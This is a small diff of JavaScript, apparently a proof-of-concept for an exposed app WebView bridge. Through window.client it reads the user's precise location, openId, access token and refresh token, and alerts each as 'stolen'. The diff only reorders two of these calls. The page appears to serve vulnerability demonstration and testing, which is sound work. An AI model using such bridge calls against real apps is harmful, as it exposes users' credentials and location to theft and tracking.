@@ -53,11 +53,12 @@
    var stealAddr = window.client.getLocationAddress();
    alert('窃取到您的实时精确地址位置:'+ stealAddr);
   
-   var openId=window.client.openId();
-  alert('窃取到您的openid:'+ openId);  
      
    var stealToken = window.client.getToken();
    alert('窃取到您的token:'+ stealToken);
+  
+  var openId=window.client.openId();
+  alert('窃取到您的openid:'+ openId);  
      
    var stealReToken = window.client.refreshToken();
    alert('窃取到您的refresh token:'+ stealReToken);  
